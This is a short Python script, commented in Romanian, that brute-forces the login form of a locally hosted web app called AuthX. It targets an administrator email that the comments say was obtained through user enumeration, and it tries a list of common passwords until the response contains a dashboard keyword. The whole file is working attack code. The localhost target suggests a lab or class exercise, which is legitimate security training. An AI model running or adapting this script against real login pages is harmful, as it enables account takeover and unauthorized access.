import requests

# Adresa paginii de login din aplicatia noastra
URL = "http://127.0.0.1:5000/login"

# Email-ul pe care l-am aflat deja prin User Enumeration
target_email = "admin@authx.com" 

# Lista de parole comune (wordlist) pentru test
passwords = ["123456", "password", "admin123", "secret", "johnny"]

print(f"--- Incepem atacul Brute Force pe: {target_email} ---")

for pwd in passwords:
    # Pregatim datele pe care le trimitem in formularul de login
    data = {
        "email": target_email,
        "password": pwd
    }
    
    # Trimitem cererea catre server
    response = requests.post(URL, data=data)
    
    # Daca in raspuns apare cuvantul "Tichet", inseamna ca am ajuns in dashboard
    if "Tichet" in response.text:
        print(f"[!] SUCCES! Parola gasita este: {pwd}")
        break
    else:
        print(f"[-] Incercare esuata pentru parola: {pwd}")

print("--- Atac finalizat ---")